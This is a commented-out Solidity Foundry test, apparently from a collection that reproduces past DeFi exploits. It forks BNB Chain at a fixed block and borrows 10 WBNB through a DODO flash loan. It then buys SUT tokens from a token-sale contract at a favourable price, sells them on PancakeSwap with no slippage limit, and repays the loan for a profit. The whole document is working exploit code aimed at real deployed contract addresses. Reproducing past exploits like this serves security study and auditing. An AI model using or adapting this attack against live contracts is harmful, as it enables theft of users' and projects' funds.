// contract SUT is Test {
//     IDPPOracle DPPOracle = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
//     IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
//     IERC20 SUT = IERC20(0x70E1bc7E53EAa96B74Fad1696C29459829509bE2);
//     ISUTTokenSale SUTTokenSale = ISUTTokenSale(0xF075c5C7BA59208c0B9c41afcCd1f60da9EC9c37);
//     IPancakeRouter Router = IPancakeRouter(0x13f4EA83D0bd40E75C8222255bc855a974568Dd4);


//     function setUp() external {
//         vm.createSelectFork("https://rpc.ankr.com/bsc", 30165900 );
//     }

//     function testExploit() external {
       
//         vm.deal(address(this), 0 ether);
//         WBNB.approve(address(Router), type(uint256).max);
//         SUT.approve(address(Router), type(uint256).max);
//         DPPOracle.flashLoan(
//             10e18,
//             0,
//             address(this),
//             new bytes(1) 
//         );
//     }

//     function DPPFlashLoanCall(address sender, uint baseAmt, uint quoteAmt, bytes calldata data) external {
       
//         WBNB.withdraw(10e18);
//         SUTTokenSale.buyTokens{value: 6855184233076263744 }(32663166885742087138); 
//         swapSUTtoWBNB();
//         WBNB.deposit{value: address(this).balance}();
//         WBNB.transfer(address(DPPOracle), 10e18);
//     }

//     function swapSUTtoWBNB() internal {
//         IPancakeRouter.ExactInputSingleParams memory params = IPancakeRouter.ExactInputSingleParams({
//             tokenIn: address(SUT),
//             tokenOut: address(WBNB),
//             fee: 2500,
//             recipient: address(this),
//             amountIn: 32663166885742087138,
//             amountOutMinimum: 0,
//             sqrtPriceLimitX96: 0
//         });
//         Router.exactInputSingle(params);
//     }
//     receive() external payable {}
// }